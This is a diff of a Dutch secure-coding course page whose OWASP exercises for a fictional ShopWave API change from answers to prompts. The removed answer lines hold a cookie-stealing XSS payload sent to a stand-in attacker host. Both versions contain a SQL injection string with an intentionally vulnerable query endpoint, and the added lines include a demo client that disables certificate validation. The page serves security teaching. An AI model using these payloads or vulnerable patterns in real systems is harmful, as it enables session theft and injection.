@@ -1,129 +1,119 @@
 ---
-title: "Les 9: Secure Coding — OWASP Top 10 — Oefeningen"
+title: "Les 8: Oefeningen - Secure Coding (OWASP)"
 sidebar_label: "Oefeningen"
 ---
 
-# Les 9: Secure Coding — OWASP Top 10 — Oefeningen
+# Oefeningen: Secure Coding (OWASP)
 
-> **Code-afspraken:** geen top-level statements · altijd `{}` · max één `return` · geen `break`/`continue` · geen underscore-prefix op parameters · geen geneste klassen · geen ternary/null-conditional · geen tuples · `double` i.p.v. `decimal` · identifiers Engels · tekst Nederlands
+Werk de oefeningen in volgorde. Elke oefening bouwt verder op de vorige. Kijk niet vooraf in de oplossingen.
+
+Je werkt verder in de bestaande ShopWave-solution. Nieuwe klassen maak je aan in `ShopWave.Api/`.
 
 ---
 
-## Oefening 1 — SQL Injection op productnaam
+<h3 class="opdracht-titel">Opdracht</h3>
 
-**Opgave:** Schrijf een kwetsbare en een veilige versie van een zoekendpoint op productnaam. Test de aanval `?product=' OR '1'='1` op de kwetsbare versie (alle orders worden zichtbaar). Verifieer dat de veilige versie het blokkeert.
+## Oefening 1: SQL Injection op productnaam
 
-**Kwetsbare versie (enkel voor demonstratie — nooit in productie)**
+**Leerdoel:** je bouwt eerst een kwetsbaar endpoint, voert de aanval zelf uit en fixt het daarna. Zo begrijp je waarom string interpolatie gevaarlijk is.
 
-```csharp
-app.MapGet("/orders/zoek-kwetsbaar", HandleZoekKwetsbaar);
+**Moeilijkheidsgraad:** basis
 
-IResult HandleZoekKwetsbaar(string product)
-{
-    // KWETSBAAR: input direct in querylogica
-    string query = $"SELECT * FROM orders WHERE product = '{product}'";
-    Console.WriteLine($"[KWETSBAAR] Query: {query}");
+**Situatie:** ShopWave wil klanten toestaan om te zoeken op productnaam. Je voegt een zoekendpoint toe dat orders filtert op productnaam. Je bouwt eerst de kwetsbare versie, test de aanval en fixt daarna.
 
-    List<string> resultaten = new List<string>();
+**Wat je doet:**
 
-    foreach (string order in orderDatabase)
-    {
-        if (order.Contains(product))
-        {
-            resultaten.Add(order);
-        }
-    }
+Voeg een endpoint `/orders/zoek-product` toe aan `ShopWave.Api/Program.cs` dat:
 
-    return Results.Ok(new { query = query, resultaten = resultaten });
-}
-```
+1. In de kwetsbare versie: de productnaam via string interpolatie in een query plakt en via `Contains` filtert. Log de samengestelde query naar de console.
+2. Na het testen: de veilige versie implementeert die de productnaam als losse parameter behandelt en enkel overeenkomsten in het tweede veld (productnaam) van de `orderDatabase` teruggeeft.
 
-**Veilige versie**
+**Vereisten:**
+
+- Het formaat van een rij in `orderDatabase` is: `"email|product|prijs"`.
+- Gebruik `order.Split('|')` om de velden te splitsen.
+- Gebruik `StringComparison.OrdinalIgnoreCase` voor de vergelijking.
+
+**Startcode:**
 
 ```csharp
 app.MapGet("/orders/zoek-product", HandleZoekProduct);
 
 IResult HandleZoekProduct(string product)
 {
-    // VEILIG: parameter staat los van de filterlogica
-    Console.WriteLine($"[VEILIG] Zoeken op product: {product}");
+    // Stap 1: kwetsbare versie
+    string query = $"SELECT * FROM orders WHERE product = '{product}'";
+    Console.WriteLine($"[KWETSBAAR] Query: {query}");
 
-    List<string> resultaten = new List<string>();
+    List<string> results = orderDatabase
+        .Where(order => order.Contains(product))
+        .ToList();
 
-    foreach (string order in orderDatabase)
-    {
-        string[] delen    = order.Split('|');
-        bool     gevonden = false;
+    return Results.Ok(new { Query = query, Results = results });
 
-        if (delen.Length >= 2)
-        {
-            gevonden = delen[1].Trim().Equals(product, StringComparison.OrdinalIgnoreCase);
-        }
-
-        if (gevonden)
-        {
-            resultaten.Add(order);
-        }
-    }
-
-    return Results.Ok(new { resultaten = resultaten });
+    // Stap 2: vervang bovenstaande door de veilige versie na het testen
 }
 ```
 
-**Antwoorden op de vragen:**
-1. `OR '1'='1` maakt de WHERE-voorwaarde altijd waar → alle rijen worden geselecteerd
-2. `--` in SQL is een commentaarmarker → alles erna in de query wordt genegeerd
-3. In de kwetsbare versie staat de parameter IN de querystructuur; in de veilige versie staat de parameter volledig los van de filterlogica
-4. In echte SQL: gebruik `SqlCommand` met `cmd.Parameters.AddWithValue("@product", product)` — nooit string-interpolatie
+**Controleer je werk:**
+
+Test 1: ga naar `https://localhost:5001/orders/zoek-product?product=Laptop`. Verwacht: enkel de Laptop-order van Alice.
+
+Test 2: ga naar `https://localhost:5001/orders/zoek-product?product=' OR '1'='1`. Verwacht in de kwetsbare versie: alle orders. Verwacht in de veilige versie: lege lijst.
+
+Beantwoord daarna schriftelijk:
+
+1. Waarom maakt `OR '1'='1` de WHERE-voorwaarde altijd waar?
+2. Wat doet `--` achteraan een SQL-injectie?
+3. Wat is het concrete verschil tussen de kwetsbare en veilige implementatie?
 
 ---
 
-## Oefening 2 — Input validatie voor /login en /verify
+<h3 class="opdracht-titel">Opdracht</h3>
 
-**Opgave:** Voeg server-side validatie toe aan `/login` (e-mail niet leeg, heeft `@`, wachtwoord niet leeg) en `/verify` (e-mail niet leeg, code = 6 tekens, code = enkel cijfers).
+## Oefening 2: Input validatie op login en verify
+
+**Leerdoel:** je voegt server-side validatie toe aan bestaande endpoints en begrijpt dat client-side validatie onvoldoende is.
+
+**Moeilijkheidsgraad:** basis
+
+**Situatie:** de `/login`- en `/verify`-endpoints in ShopWave vertrouwen momenteel blindelings op de client. Een aanvaller kan lege strings of ongeldig gevormde codes sturen. Je voegt server-side validatie toe.
+
+**Wat je doet:**
+
+Breid de handlers van `/login` en `/verify` uit met validatiecontroles.
+
+Voor `/login`:
+- E-mailadres mag niet leeg zijn (`IsNullOrWhiteSpace`). Geef `400 Bad Request` terug met `{"Error": "E-mailadres is verplicht."}`.
+- E-mailadres moet een `@` bevatten. Geef `400 Bad Request` terug met `{"Error": "Ongeldig e-mailadres."}`.
+- Wachtwoord mag niet leeg zijn. Geef `400 Bad Request` terug met `{"Error": "Wachtwoord is verplicht."}`.
+
+Voor `/verify`:
+- E-mailadres mag niet leeg zijn.
+- De 2FA-code mag niet leeg zijn.
+- De 2FA-code moet exact 6 tekens lang zijn. Geef `400 Bad Request` terug met `{"Error": "2FA-code moet exact 6 cijfers bevatten."}`.
+- De 2FA-code mag enkel cijfers bevatten. Gebruik `code.All(char.IsDigit)`.
+
+**Vereisten:**
+
+- Elke validatiecontrole staat in een apart `if`-blok met een eigen `return`.
+- Gebruik `string.IsNullOrWhiteSpace(...)` voor lege-string-controles.
+- Geen ternary-operatoren.
+
+**Startcode:**
 
 ```csharp
-app.MapPost("/login", HandleLogin);
-
 IResult HandleLogin(LoginRequest request)
 {
-    bool emailLeeg       = string.IsNullOrWhiteSpace(request.Email);
-    bool geenAtTeken     = !request.Email.Contains('@');
-    bool wachtwoordLeeg  = string.IsNullOrWhiteSpace(request.Password);
-
-    if (emailLeeg || geenAtTeken || wachtwoordLeeg)
-    {
-        return Results.BadRequest(new { fout = "Ongeldig e-mailadres of wachtwoord." });
-    }
+    // jouw validatie hier
 
     string result = accountRepository.Login(request.Email, request.Password);
-
-    return Results.Ok(new { status = result });
+    return Results.Ok(new { Status = result });
 }
-
-app.MapPost("/verify", HandleVerify);
 
 IResult HandleVerify(VerifyRequest request)
 {
-    bool emailLeeg       = string.IsNullOrWhiteSpace(request.Email);
-    bool codeOnjuist     = request.Code == null || request.Code.Length != 6;
-    bool codeNietCijfers = false;
-
-    if (!codeOnjuist)
-    {
-        foreach (char teken in request.Code)
-        {
-            if (!char.IsDigit(teken))
-            {
-                codeNietCijfers = true;
-            }
-        }
-    }
-
-    if (emailLeeg || codeOnjuist || codeNietCijfers)
-    {
-        return Results.BadRequest(new { fout = "Ongeldig e-mailadres of 2FA-code." });
-    }
+    // jouw validatie hier
 
     string result = accountRepository.VerifyTwoFactor(request.Email, request.Code);
 
@@ -135,27 +125,197 @@ IResult HandleVerify(VerifyRequest request)
     string role  = DetermineRole(request.Email);
     string token = jwtTokenService.GenerateToken(request.Email, role);
 
-    return Results.Ok(new { token = token });
+    return Results.Ok(new { Token = token });
 }
+```
+
+**Controleer je werk:** test elk foutgeval vanuit de console:
+
+```csharp
+// Leeg e-mailadres
+string emptyEmail = JsonSerializer.Serialize(new { email = "", password = "wachtwoord123" });
+HttpResponseMessage r1 = client.PostAsync("/login",
+    new StringContent(emptyEmail, Encoding.UTF8, "application/json")).Result;
+Console.WriteLine($"Leeg e-mail: {r1.StatusCode}");
+
+// Ongeldige 2FA-code (5 cijfers)
+string shortCode = JsonSerializer.Serialize(new { email = "alice@shopwave.be", code = "12345" });
+HttpResponseMessage r2 = client.PostAsync("/verify",
+    new StringContent(shortCode, Encoding.UTF8, "application/json")).Result;
+Console.WriteLine($"Korte code: {r2.StatusCode}");
+
+// Niet-numerieke 2FA-code
+string alphaCode = JsonSerializer.Serialize(new { email = "alice@shopwave.be", code = "abc123" });
+HttpResponseMessage r3 = client.PostAsync("/verify",
+    new StringContent(alphaCode, Encoding.UTF8, "application/json")).Result;
+Console.WriteLine($"Niet-numeriek: {r3.StatusCode}");
+```
+
+Verwacht resultaat:
+
+```
+Leeg e-mail: BadRequest
+Korte code: BadRequest
+Niet-numeriek: BadRequest
 ```
 
 ---
 
-## Oefening 3 — XSS in context begrijpen (analyse)
+<h3 class="opdracht-titel">Opdracht</h3>
 
-1. **`@Html.Raw(notitie.Text)` geeft script-injectie:** de browser voert de meegegeven JavaScript uit alsof die van de website komt.
-2. **Kwaadaardige payload:** `<script>fetch('https://aanvaller.com/?c='+document.cookie)</script>` — stuurt sessie-cookies door naar de aanvaller.
-3. **Impact:** elke medewerker die de pagina bezoekt, voert onbewust de kwaadaardige code uit. Sessie-tokens worden gestolen.
-4. **Twee maatregelen:** (1) output encoding via de template engine (`@notitie.Text` in Razor, niet `@Html.Raw`); (2) een strenge Content-Security-Policy die inline scripts verbiedt.
-5. **Beheerspaneel is gevaarlijker** omdat medewerkers hogere rechten hebben — een aanvaller die hun sessie steelt, krijgt ook die hogere rechten.
+## Oefening 3: Rate limiting op het login-endpoint
+
+**Leerdoel:** je implementeert rate limiting en begrijpt hoe het een brute-force aanval vertraagt.
+
+**Moeilijkheidsgraad:** gemiddeld
+
+**Situatie:** een aanvaller probeert het wachtwoord van `alice@shopwave.be` te raden via een geautomatiseerd script. Zonder rate limiting kan hij honderden pogingen per minuut doen. Je voegt een fixed window limiter toe die maximaal 5 loginpogingen per minuut toestaat per IP-adres.
+
+**Wat je doet:**
+
+1. Voeg `AddRateLimiter` toe aan de builder met een limiet van 5 requests per minuut voor de policy `"login"`.
+2. Activeer `UseRateLimiter()` in de pipeline.
+3. Koppel de policy aan het `/login`-endpoint via `.RequireRateLimiting("login")`.
+4. Schrijf een consolemethode `DemoBruteForce()` die 7 loginpogingen na elkaar stuurt en de statuscode van elk afdrukt.
+
+**Vereisten:**
+
+- `QueueLimit` is 0: requests die de limiet overschrijden, worden onmiddellijk geweigerd, niet in de wachtrij geplaatst.
+- `QueueProcessingOrder` is `OldestFirst`.
+- De consolemethode gebruikt een eigen `HttpClient`.
+
+**Startcode:**
+
+```csharp
+void DemoBruteForce()
+{
+    HttpClientHandler handler = new HttpClientHandler();
+    handler.ServerCertificateCustomValidationCallback =
+        (message, certificate, chain, errors) => true;
+
+    HttpClient client = new HttpClient(handler);
+    client.BaseAddress = new Uri("https://localhost:5001");
+
+    Console.WriteLine("=== Brute-force simulatie ===");
+
+    for (int attempt = 1; attempt <= 7; attempt++)
+    {
+        // jouw code hier: stuur een loginpoging en druk de statuscode af
+    }
+
+    client.Dispose();
+    handler.Dispose();
+}
+```
+
+**Controleer je werk:** verwacht resultaat:
+
+```
+=== Brute-force simulatie ===
+Poging 1: OK
+Poging 2: OK
+Poging 3: OK
+Poging 4: OK
+Poging 5: OK
+Poging 6: TooManyRequests
+Poging 7: TooManyRequests
+```
 
 ---
 
-## Oefening 5 — OWASP-analyse van een reëel incident
+<h3 class="opdracht-titel">Opdracht</h3>
 
-| Bevinding                              | OWASP-kwetsbaarheid       | CIA                     | Maatregel                                  |
-|----------------------------------------|---------------------------|-------------------------|--------------------------------------------|
-| Alle orders via zoekendpoint opvraagbaar | A03 Injection / A01 Broken Access Control | Confidentiality | Parameterized queries + autorisatie per endpoint |
-| `/swagger` toont `/admin/stats`        | A05 Security Misconfiguration | Confidentiality    | Swagger beperken tot development-omgeving  |
-| JWT-sleutel in GitHub-commit          | A05 Security Misconfiguration | Confidentiality    | User Secrets / Key Vault; verwijder uit Git-geschiedenis |
-| Databasestring leesbaar via `/crash`  | A05 Security Misconfiguration | Confidentiality    | Developer Exception Page enkel in development |
+## Oefening 4: CORS correct configureren
+
+**Leerdoel:** je implementeert een CORS-policy en begrijpt het verschil tussen een open en een gesloten configuratie.
+
+**Moeilijkheidsgraad:** gemiddeld
+
+**Situatie:** ShopWave krijgt een frontend op `https://shopwave.be`. Die frontend moet de API kunnen aanroepen. Alle andere origins moeten geweigerd worden. Je configureert CORS zodat enkel de ShopWave-frontend toegang heeft.
+
+**Wat je doet:**
+
+1. Voeg `AddCors` toe aan de builder met een policy `"ShopWavePolicy"` die enkel `"https://shopwave.be"` en `"https://localhost:3000"` toestaat.
+2. Activeer `UseCors("ShopWavePolicy")` in de pipeline, na `app.UseAuthentication()`.
+3. Maak een klasse `CorsValidator` in `ShopWave/Security/CorsValidator.cs` met een methode `SimulateRequest(string origin)` die simuleert of een origin toegestaan is of niet. De methode geeft `true` terug als de origin in een vaste lijst staat en `false` anders.
+
+**Vereisten voor `CorsValidator`:**
+
+- De toegestane origins staan als `private readonly List<string>` in de klasse.
+- De constructor vult die lijst.
+- `SimulateRequest` gebruikt `_allowedOrigins.Contains(origin)`.
+
+**Startcode:**
+
+```csharp
+namespace ShopWave.Security
+{
+    public class CorsValidator
+    {
+        private readonly List<string> _allowedOrigins;
+
+        public CorsValidator()
+        {
+            _allowedOrigins = new List<string>
+            {
+                "https://shopwave.be",
+                "https://localhost:3000"
+            };
+        }
+
+        public bool SimulateRequest(string origin)
+        {
+            // jouw code hier
+            return false;
+        }
+    }
+}
+```
+
+**Controleer je werk:** voeg tijdelijk toe aan `ShopWave/Program.cs`:
+
+```csharp
+CorsValidator validator = new CorsValidator();
+
+Console.WriteLine($"shopwave.be:   {validator.SimulateRequest("https://shopwave.be")}");
+Console.WriteLine($"aanvaller.be:  {validator.SimulateRequest("https://aanvaller.be")}");
+Console.WriteLine($"localhost:3000:{validator.SimulateRequest("https://localhost:3000")}");
+```
+
+Verwacht resultaat:
+
+```
+shopwave.be:   True
+aanvaller.be:  False
+localhost:3000:True
+```
+
+---
+
+<h3 class="opdracht-titel">Opdracht</h3>
+
+## Oefening 5: OWASP-analyse van een incident
+
+**Leerdoel:** je koppelt concrete bevindingen aan OWASP-kwetsbaarheden, het CIA-model en concrete maatregelen.
+
+**Moeilijkheidsgraad:** basis (reflectie)
+
+**Situatie:** ShopWave is een maand live. Een beveiligingsonderzoeker meldt vier bevindingen.
+
+Beantwoord per bevinding: welke OWASP-kwetsbaarheid is dit, welke CIA-pijler wordt geschonden, welke concrete maatregel had dit voorkomen en wat is de potentiële impact voor ShopWave en haar klanten?
+
+**Bevinding 1:**
+
+Via het zoekendpoint kon de onderzoeker alle orders van alle klanten opvragen door `' OR '1'='1` als e-mailadres te sturen.
+
+**Bevinding 2:**
+
+Via `/swagger` vond de onderzoeker een endpoint `/admin/stats` dat nergens gedocumenteerd was en toegankelijk was zonder authenticatie.
+
+**Bevinding 3:**
+
+De onderzoeker vond de JWT-sleutel `ShopWaveGeheimeSleutel2024!!XYZ#` terug in een commit van drie weken geleden in de publieke GitHub-repository. Iemand had de sleutel hardcoded ingesteld en daarna verwijderd, maar de git-geschiedenis bewaart alles.
+
+**Bevinding 4:**
+
+Via het `/crash`-endpoint kon de onderzoeker een week eerder de volledige databaseconnectiestring lezen, inclusief het IP-adres, de gebruikersnaam en het wachtwoord van de databasegebruiker.
